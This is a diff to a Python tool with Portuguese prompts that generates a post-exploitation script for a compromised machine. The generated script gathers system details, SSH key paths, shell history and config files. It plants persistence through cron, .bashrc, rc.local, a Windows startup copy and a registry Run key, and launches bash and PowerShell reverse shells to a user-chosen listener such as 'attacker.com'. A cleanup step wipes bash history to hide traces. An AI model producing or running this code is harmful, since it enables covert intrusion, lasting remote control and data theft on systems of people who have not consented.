@@ -159,13 +159,17 @@ class PostExploitGenerator:
         print("║                  CONFIGURAR LISTENER (C2)                    ║")
         print("╚══════════════════════════════════════════════════════════════╝")
         
-        ip = input("\nDigite o IP ou domínio do listener (ex: attacker.com): ")
-        port = input("Digite a porta do listener (ex: 4444): ")
+        ip = input("\nDigite o IP ou domínio do listener (ex: attacker.com): ").strip()
+        port = input("Digite a porta do listener (ex: 4444): ").strip()
         
         if ip:
             self.config['listener_ip'] = ip
         if port:
-            self.config['listener_port'] = port
+            if port.isdigit() and 1 <= int(port) <= 65535:
+                self.config['listener_port'] = port
+            else:
+                print("\n[!] Porta inválida. Mantendo porta padrão (4444).")
+                sleep(1)
         
         print("\n[+] Listener configurado com sucesso!")
         self.press_enter()
@@ -176,7 +180,7 @@ class PostExploitGenerator:
         print("║               DEFINIR NOME DO ARQUIVO DE SAÍDA              ║")
         print("╚══════════════════════════════════════════════════════════════╝")
         
-        filename = input("\nDigite o nome do arquivo de saída (ex: exploit.py): ")
+        filename = input("\nDigite o nome do arquivo de saída (ex: exploit.py): ").strip()
         
         if filename:
             if not filename.endswith('.py'):
@@ -212,18 +216,45 @@ class PostExploitGenerator:
         print(f"    - Arquivo: {self.config['output_file']}\n")
         
         try:
-            with open(self.config['output_file'], 'w') as f:
+            # Verifica e cria diretório se necessário
+            output_path = os.path.abspath(self.config['output_file'])
+            output_dir = os.path.dirname(output_path)
+            
+            if output_dir and not os.path.exists(output_dir):
+                os.makedirs(output_dir, exist_ok=True)
+            
+            # Verifica permissões de escrita
+            if os.path.exists(output_path):
+                if not os.access(output_path, os.W_OK):
+                    print("\n[!] Erro: Sem permissão para escrever no arquivo existente.")
+                    self.press_enter()
+                    return
+            
+            with open(output_path, 'w', encoding='utf-8') as f:
                 f.write(self.generate_script_content())
             
-            print(f"\n[+] Script gerado com sucesso: {self.config['output_file']}")
-            print("[+] Tamanho do arquivo:", os.path.getsize(self.config['output_file']), "bytes"
+            file_size = os.path.getsize(output_path)
+            print(f"\n[+] Script gerado com sucesso: {output_path}")
+            print(f"[+] Tamanho do arquivo: {file_size} bytes")
+            print(f"[+] Permissões: {oct(os.stat(output_path).st_mode & 0o777)}")
+            
+        except PermissionError:
+            print("\n[!] Erro: Permissão negada. Não é possível escrever no arquivo/diretório.")
         except Exception as e:
             print(f"\n[!] Erro ao gerar o script: {str(e)}")
         
         self.press_enter()
     
     def generate_script_content(self):
-        script = """import os
+        script = """#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+#
+# Script de Pós-Exploração Automático
+# Gerado por PostExploitGenerator
+#
+# Uso: Execute este script no sistema alvo após obter acesso inicial
+
+import os
 import platform
 import subprocess
 import sys
@@ -301,7 +332,8 @@ class PostExploitTool:
                 'users': 'net user',
                 'processes': 'tasklist',
                 'firewall': 'netsh advfirewall show allprofiles',
-                'drives': 'wmic logicaldisk get caption,description,providername'
+                'drives': 'wmic logicaldisk get caption,description,providername',
+                'installed_software': 'wmic product get name,version'
             }
         else:
             commands = {
@@ -311,52 +343,66 @@ class PostExploitTool:
                 'processes': 'ps aux',
                 'sudo_users': 'grep -Po \\'^sudo.+:\\\\K.*$\\' /etc/group',
                 'crontab': 'crontab -l',
-                'ssh_keys': 'find / -name "id_*" -type f 2>/dev/null'
+                'ssh_keys': 'find / -name "id_*" -type f 2>/dev/null',
+                'installed_packages': 'dpkg -l || rpm -qa'
             }
             
             if self.os_type == 'termux':
                 commands['termux_info'] = 'termux-info'
+                commands['termux_packages'] = 'apt list --installed'
         
         for name, cmd in commands.items():
             print(f"[*] Testing {name}...")
-            self.collected_data[name] = self.run_command(cmd)
-            sleep(0.5)
+            try:
+                self.collected_data[name] = self.run_command(cmd)
+                sleep(0.3)
+            except Exception as e:
+                self.collected_data[name] = f"Error collecting {name}: {str(e)}"
         
         print("[+] System information collected!\\n")
     
     def check_history(self):
         print("[+] Checking command history...")
-        if self.os_type == 'windows':
-            history = self.run_command('doskey /history')
-        else:
-            history = self.run_command('history')
-        
-        self.collected_data['command_history'] = history
-        print("[+] Command history extracted\\n")
+        try:
+            if self.os_type == 'windows':
+                history = self.run_command('doskey /history')
+            else:
+                history = self.run_command('history')
+            
+            self.collected_data['command_history'] = history
+            print("[+] Command history extracted\\n")
+        except Exception as e:
+            self.collected_data['command_history'] = f"Error getting history: {str(e)}"
+            print("[!] Failed to get command history\\n")
     
     def check_interesting_files(self):
         print("[+] Searching for interesting files...")
         
-        if self.os_type == 'windows':
-            files = {
-                'desktop_files': 'dir "%USERPROFILE%\\\\Desktop\\\\*" /s /b',
-                'documents': 'dir "%USERPROFILE%\\\\Documents\\\\*" /s /b',
-                'downloads': 'dir "%USERPROFILE%\\\\Downloads\\\\*" /s /b'
-            }
-        else:
-            files = {
-                'home_files': 'find ~/ -type f -name "*" 2>/dev/null | head -n 50',
-                'config_files': 'find /etc/ -type f -name "*.conf" 2>/dev/null | head -n 30',
-                'ssh_config': 'cat ~/.ssh/config 2>/dev/null',
-                'bashrc': 'cat ~/.bashrc 2>/dev/null'
-            }
-        
-        for name, cmd in files.items():
-            print(f"[*] Checking {name}...")
-            self.collected_data[name] = self.run_command(cmd)
-            sleep(0.3)
-        
-        print("[+] File search completed\\n")
+        try:
+            if self.os_type == 'windows':
+                files = {
+                    'desktop_files': 'dir "%USERPROFILE%\\\\Desktop\\\\*" /s /b',
+                    'documents': 'dir "%USERPROFILE%\\\\Documents\\\\*" /s /b',
+                    'downloads': 'dir "%USERPROFILE%\\\\Downloads\\\\*" /s /b',
+                    'recent_files': 'dir "%APPDATA%\\\\Microsoft\\\\Windows\\\\Recent\\\\*" /s /b'
+                }
+            else:
+                files = {
+                    'home_files': 'find ~/ -type f -name "*" 2>/dev/null | head -n 50',
+                    'config_files': 'find /etc/ -type f -name "*.conf" 2>/dev/null | head -n 30',
+                    'ssh_config': 'cat ~/.ssh/config 2>/dev/null',
+                    'bashrc': 'cat ~/.bashrc 2>/dev/null',
+                    'bash_history': 'cat ~/.bash_history 2>/dev/null'
+                }
+            
+            for name, cmd in files.items():
+                print(f"[*] Checking {name}...")
+                self.collected_data[name] = self.run_command(cmd)
+                sleep(0.3)
+            
+            print("[+] File search completed\\n")
+        except Exception as e:
+            print(f"[!] Error during file search: {str(e)}\\n")
             """
 
         if self.config['check_vulns']:
@@ -364,24 +410,34 @@ class PostExploitTool:
     def check_vulnerabilities(self):
         print("[+] Checking for common vulnerabilities...")
         
-        if self.os_type == 'linux' or self.os_type == 'termux':
-            # Check for SUID binaries
-            self.collected_data['suid_binaries'] = self.run_command('find / -perm -4000 -type f 2>/dev/null | xargs ls -la 2>/dev/null')
+        try:
+            if self.os_type == 'linux' or self.os_type == 'termux':
+                # Check for SUID binaries
+                self.collected_data['suid_binaries'] = self.run_command('find / -perm -4000 -type f 2>/dev/null | xargs ls -la 2>/dev/null')
+                
+                # Check writable directories
+                self.collected_data['writable_dirs'] = self.run_command('find / -type d -writable 2>/dev/null | grep -v "/proc/"')
+                
+                # Check kernel version
+                self.collected_data['kernel_version'] = self.run_command('uname -r')
+                
+                # Check for misconfigured sudo permissions
+                self.collected_data['sudo_perms'] = self.run_command('sudo -l')
+                
+            elif self.os_type == 'windows':
+                # Check Windows version
+                self.collected_data['windows_version'] = self.run_command('wmic os get caption,version')
+                
+                # Check installed patches
+                self.collected_data['hotfixes'] = self.run_command('wmic qfe list')
+                
+                # Check for AlwaysInstallElevated
+                self.collected_data['always_install_elevated'] = self.run_command('reg query HKCU\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows\\\\Installer /v AlwaysInstallElevated')
+                self.collected_data['always_install_elevated'] += "\\n" + self.run_command('reg query HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows\\\\Installer /v AlwaysInstallElevated')
             
-            # Check writable directories
-            self.collected_data['writable_dirs'] = self.run_command('find / -type d -writable 2>/dev/null | grep -v "/proc/"')
-            
-            # Check kernel version
-            self.collected_data['kernel_version'] = self.run_command('uname -r')
-            
-        elif self.os_type == 'windows':
-            # Check Windows version
-            self.collected_data['windows_version'] = self.run_command('wmic os get caption,version')
-            
-            # Check installed patches
-            self.collected_data['hotfixes'] = self.run_command('wmic qfe list')
-        
-        print("[+] Vulnerability checks completed\\n")
+            print("[+] Vulnerability checks completed\\n")
+        except Exception as e:
+            print(f"[!] Error during vulnerability checks: {str(e)}\\n")
             """
 
         if self.config['persistence']:
@@ -389,21 +445,31 @@ class PostExploitTool:
     def attempt_persistence(self):
         print("[+] Attempting persistence mechanisms...")
         
-        if self.os_type == 'linux' or self.os_type == 'termux':
-            # Try adding to cron
-            cron_cmd = '(crontab -l 2>/dev/null; echo "@reboot sleep 60 && /bin/bash -c \\'exec 9<> /dev/tcp/{listener_ip}/{listener_port} && exec 0<&9 && exec 1>&9 2>&9 && /bin/bash --noprofile -i\\'") | crontab -'
-            self.collected_data['cron_persistence'] = self.run_command(cron_cmd)
+        try:
+            if self.os_type == 'linux' or self.os_type == 'termux':
+                # Try adding to cron
+                cron_cmd = '(crontab -l 2>/dev/null; echo "@reboot sleep 60 && /bin/bash -c \\'exec 9<> /dev/tcp/{listener_ip}/{listener_port} && exec 0<&9 && exec 1>&9 2>&9 && /bin/bash --noprofile -i\\'") | crontab -'
+                self.collected_data['cron_persistence'] = self.run_command(cron_cmd)
+                
+                # Try modifying .bashrc
+                bashrc_cmd = 'echo "bash -i >& /dev/tcp/{listener_ip}/{listener_port} 0>&1 &" >> ~/.bashrc'
+                self.collected_data['bashrc_persistence'] = self.run_command(bashrc_cmd)
+                
+                # Try adding to /etc/rc.local
+                self.collected_data['rclocal_persistence'] = self.run_command('echo "/bin/bash -c \\'exec 9<> /dev/tcp/{listener_ip}/{listener_port} && exec 0<&9 && exec 1>&9 2>&9 && /bin/bash --noprofile -i\\' &" >> /etc/rc.local')
+                
+            elif self.os_type == 'windows':
+                # Try adding to startup
+                startup_cmd = 'copy "%~f0" "%APPDATA%\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\"'
+                self.collected_data['startup_persistence'] = self.run_command(startup_cmd)
+                
+                # Try adding registry run key
+                reg_cmd = f'reg add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v "Update" /t REG_SZ /d "\\"%CD%\\\\{os.path.basename(__file__)}\\" /background" /f'
+                self.collected_data['registry_persistence'] = self.run_command(reg_cmd)
             
-            # Try modifying .bashrc
-            bashrc_cmd = 'echo "bash -i >& /dev/tcp/{listener_ip}/{listener_port} 0>&1 &" >> ~/.bashrc'
-            self.collected_data['bashrc_persistence'] = self.run_command(bashrc_cmd)
-            
-        elif self.os_type == 'windows':
-            # Try adding to startup
-            startup_cmd = 'copy "%~f0" "%APPDATA%\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\"'
-            self.collected_data['startup_persistence'] = self.run_command(startup_cmd)
-        
-        print("[+] Persistence mechanisms attempted\\n")
+            print("[+] Persistence mechanisms attempted\\n")
+        except Exception as e:
+            print(f"[!] Error attempting persistence: {str(e)}\\n")
             """.format(
                 listener_ip=self.config['listener_ip'],
                 listener_port=self.config['listener_port']
@@ -414,16 +480,21 @@ class PostExploitTool:
     def establish_reverse_shell(self):
         print("[+] Attempting to establish reverse shell...")
         
-        if self.os_type == 'windows':
-            cmd = 'powershell -c "$client = New-Object System.Net.Sockets.TCPClient(\\'{listener_ip}\\',{listener_port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \\'PS \\' + (pwd).Path + \\'> \\';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"'
-        else:
-            cmd = 'bash -c "exec 9<> /dev/tcp/{listener_ip}/{listener_port};exec 0<&9;exec 1>&9 2>&9;/bin/bash --noprofile -i"'
-        
         try:
-            subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+            if self.os_type == 'windows':
+                cmd = 'powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(\\'{listener_ip}\\',{listener_port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \\'PS \\' + (pwd).Path + \\'> \\';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"'
+            else:
+                cmd = 'bash -c "exec 9<> /dev/tcp/{listener_ip}/{listener_port};exec 0<&9;exec 1>&9 2>&9;/bin/bash --noprofile -i"'
+            
+            # Run in background
+            if self.os_type == 'windows':
+                subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, creationflags=subprocess.CREATE_NO_WINDOW)
+            else:
+                subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+            
             print("[+] Reverse shell attempted to {listener_ip}:{listener_port}")
         except Exception as e:
-            print(f"[!] Failed to establish reverse shell: {{str(e)}}")
+            print(f"[!] Failed to establish reverse shell: {str(e)}")
             """.format(
                 listener_ip=self.config['listener_ip'],
                 listener_port=self.config['listener_port']
@@ -432,14 +503,35 @@ class PostExploitTool:
         script += """
     def save_data(self):
         print("[+] Saving collected data...")
-        filename = f"exploit_data_{{self.os_type}}.txt"
-        with open(filename, 'w') as f:
-            for section, data in self.collected_data.items():
-                f.write(f"\\n=== {{section.upper()}} ===\\n")
-                f.write(data)
-                f.write("\\n")
-        
-        print(f"[+] Data saved to {{filename}}")
+        try:
+            filename = f"exploit_data_{{self.os_type}}_{{os.getpid()}}.txt"
+            with open(filename, 'w', encoding='utf-8') as f:
+                f.write(f"=== POST-EXPLOITATION REPORT ===\\n")
+                f.write(f"Target OS: {{self.os_type}}\\n")
+                f.write(f"Listener: {{self.listener_ip}}:{{self.listener_port}}\\n\\n")
+                
+                for section, data in self.collected_data.items():
+                    f.write(f"\\n=== {{section.upper()}} ===\\n")
+                    f.write(str(data))
+                    f.write("\\n")
+            
+            print(f"[+] Data saved to {{filename}}")
+            return filename
+        except Exception as e:
+            print(f"[!] Error saving data: {{str(e)}}")
+            return None
+    
+    def cleanup(self):
+        print("[+] Performing basic cleanup...")
+        try:
+            if self.os_type == 'linux' or self.os_type == 'termux':
+                # Remove command history
+                self.run_command('history -c && rm -f ~/.bash_history')
+            elif self.os_type == 'windows':
+                # Clear recent commands
+                self.run_command('doskey /reinstall')
+        except:
+            pass
     
     def run(self):
         self.print_banner()
@@ -468,18 +560,36 @@ class PostExploitTool:
             """
 
         script += """
-        self.save_data()
+        report_file = self.save_data()
+        self.cleanup()
         
         print("\\n[+] Post-exploitation completed!")
-        print("[+] System compromised and data exfiltrated")
+        if report_file:
+            print(f"[+] Report saved to: {{report_file}}")
+        else:
+            print("[!] Could not save report file")
 
 if __name__ == "__main__":
-    tool = PostExploitTool()
-    tool.run()
+    try:
+        tool = PostExploitTool()
+        tool.run()
+    except KeyboardInterrupt:
+        print("\\n[!] Interrupted by user")
+        sys.exit(1)
+    except Exception as e:
+        print(f"\\n[!] Critical error: {{str(e)}}")
+        sys.exit(1)
         """
 
         return script
 
 if __name__ == "__main__":
-    generator = PostExploitGenerator()
-    generator.show_menu()
+    try:
+        generator = PostExploitGenerator()
+        generator.show_menu()
+    except KeyboardInterrupt:
+        print("\n[!] Interrupted by user")
+        sys.exit(1)
+    except Exception as e:
+        print(f"\n[!] Fatal error: {str(e)}")
+        sys.exit(1)
